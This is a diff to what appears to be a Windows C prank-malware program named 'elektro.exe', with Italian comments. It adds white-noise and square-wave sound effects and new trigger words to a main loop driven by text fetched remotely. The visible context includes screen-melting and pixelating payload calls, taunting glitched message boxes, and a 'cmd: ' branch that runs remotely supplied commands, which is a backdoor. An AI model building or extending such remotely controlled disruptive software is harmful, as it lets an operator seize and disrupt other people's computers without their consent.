@@ -370,11 +370,10 @@ void startfx() {
     mtrfkngatombomb();
 }
 
-void squarewave_sfx() {
+// MAI E DICO MAI settare duration su un valore minore di 1 anche se metti i float. Perche' le moltiplicazioni si sminchiano.
+void squarewave_sfx(int FREQ, int DURATION) {
     // settingz (poi in caso li gestisco ad incrementazione o decrementazione per fare dei bei sfx)
     int SR = 44100;
-    int FREQ = 1 + FREQ; // progressive freq
-    int DURATION = 1;
 
     HWAVEOUT h; // puntatore interno windows per il device audio
     // config audio:
@@ -413,6 +412,31 @@ void squarewave_sfx() {
     while (!(hdr.dwFlags & WHDR_DONE)) Sleep(10); // loopa ntil the end
     free(buf);
     waveOutClose(h); // chiudi dev audio
+}
+
+void whitenoise_sfx(int DURATION) {
+    int SR = 44100;
+    HWAVEOUT h;
+    WAVEFORMATEX w = {WAVE_FORMAT_PCM, 1, SR, SR * 2, 2, 16, 0};
+    waveOutOpen(&h, WAVE_MAPPER, &w, 0, 0, CALLBACK_NULL);
+    int n = SR * DURATION;
+    short *buf = (short*)malloc(n * sizeof(short));
+
+    for (int i = 0; i < n; i++) {
+        // rumore bianco centrato su 0
+        buf[i] = (short)((rand() % 65536) - 32768);
+    }
+
+    WAVEHDR hdr = {0};
+    hdr.lpData = (LPSTR)buf;
+    hdr.dwBufferLength = n * sizeof(short);
+    waveOutPrepareHeader(h, &hdr, sizeof(hdr));
+    waveOutWrite(h, &hdr, sizeof(hdr));
+    Sleep(DURATION * 1000);
+    waveOutUnprepareHeader(h, &hdr, sizeof(hdr));
+    waveOutClose(h);
+
+    free(buf);
 }
 
 void msgbox() {
@@ -496,13 +520,18 @@ void countdown(int secs) { // passa secs da curl (curl lo mette nella var 'secs'
 
 void wrongchoose() {
     ULONGLONG elapsed = GetTickCount64();
-    MessageBoxW(NULL, L"Sai chi e' Lulu'?", L"elektro.exeunasinewave", MB_YESNO | MB_ICONINFORMATION); // la (L"xyz") server per fare l'unicode e non ansi. Altrimenti le robbe tipo "eùàò" si sminchianoo
+    MessageBoxW(NULL, L"Sai chi e' Lulu'?", L"elektro.exe", MB_YESNO | MB_ICONINFORMATION); // la (L"xyz") server per fare l'unicode e non ansi. Altrimenti le robbe tipo "eùàò" si sminchianoo
     MessageBoxW(NULL, L"3͘_̝͙̲̏ͪ̌̇̓̚͞L̸̢̰̙̖̣ͪ̌̋ͮ͊̎̄̂͞3̪̪7̨̧͍̩̤̪ͨ͆̿ͪ́ͨ_̖̼̞̭̳͔̽͗̽͌̀̆́̚T̨̫͇̭͔͓̬̪̙̯̐ͧ̏̾̃͌͞͞R̷̡̤͍̬̗͇̻̖͕͈ͧ͑́̐͒̓̒ͯ͌̀͑ͧ̆̆̾͌̈͘̕̚̚͜͡ͅͅ0̶̨̜̯͉͎̞͈̘͙̺͖͍̆̇̎͑ͦ̍̓̀ͨ̑̑͌́̑̆͘͠͡W̝̲̥̪̦͔͇̻̼̞̫̮͖̐͛̆ͥ͌̉͆̐̏̑́ͮ͝͡͡4̵̴̧̢̧̤̝͙̝̘̰͉͙̃̄̎́̊̚͢S̸̨̢͇̯̯͍̗̟̺̤͖̯͕̹̟̯͎̗͔͇ͫ̋ͮͥͤ̆ͦ̑̽̇̒̌̕͡͝͞H̺̩̠̖̑͊̀̓̄ͣͦͅ3̩̍̇R̸̶̨̡̛̟͎̼̤̩̭̫͈͚͖̼̖̬̯̤̗̠̻͔̋ͭͥ̿͛̐̌̃͐̂̉ͨͥ̀̆͘͟͜͢͡͞͡͝3̵̸̸̨̧̛̪͖̦̮̱͚̠ͧ̉̀͌͂̀̈́͜ͅ", L"LULU.EXE", MB_OK | MB_ICONERROR); // idem qui, però l'ultima volta non è andato il testo unicode
     while(1) {
         if (GetTickCount64() - elapsed < 60000) {lulu();pixelate();mtrfkngatombomb();}
         else if (GetTickCount64() - elapsed < 80000) {fkngmelter();mtrfkngatombomb();}
         else {break;}
     }
+}
+
+void soundfx1() {
+    int i;
+    for (i=0;i<400;i++) {squarewave_sfx((rand() % 1000) + 4400 , 1);}
 }
 
 int main() {
@@ -611,13 +640,18 @@ int main() {
             wrongchoose();
         }
 
-        else if (strcmp(reqtextbuffer, "sfx") == 0) {
-            squarewave_sfx();
+        else if (strcmp(reqtextbuffer, "sfx1") == 0) {
+            soundfx1();
+        }
+        
+        else if (strcmp(reqtextbuffer, "whitenoize") == 0) {
+            whitenoise_sfx(20);
         }
 
         else if (strcmp(reqtextbuffer, "IDLE") == 0) {
             int i;
-            for (i=0;i<200;i++) {idlefx();}}
+            for (i=0;i<200;i++) {idlefx();}
+        }
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
             char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
